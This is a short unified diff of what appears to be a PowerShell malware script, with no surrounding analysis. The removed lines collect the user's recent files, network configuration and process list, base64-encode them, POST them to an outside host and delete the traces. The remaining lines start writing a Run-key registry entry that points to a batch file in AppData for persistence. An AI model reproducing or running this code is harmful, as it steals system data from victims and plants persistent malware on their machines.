@@ -1,18 +1,3 @@
-$filename = "carry.db"
-$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
-$ic = ipconfig /all
-$gp=Get-process
-ac $filename $rc -Encoding 'utf8'
-ac $filename $ic
-ac $filename $gp
-$jlkmhng='http://m4.p-e.kr/user2/mt4/mt4.php'
-$dhd=[IO.File]::readallbytes($filename)
-$iuy87=[System.Convert]::ToBase64String($dhd)
-$iuy87=[regex]::Replace($iuy87,'=','%')
-$hrfbr='access='+$iuy87
-Invoke-WebRequest -Uri $jlkmhng -Method Post -Body $hrfbr
-Remove-Item $filename -force
-
 $RegistryPath = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
 $Name         = 'Version'
 $paFile        = $env:appdata + '\ini.bat'
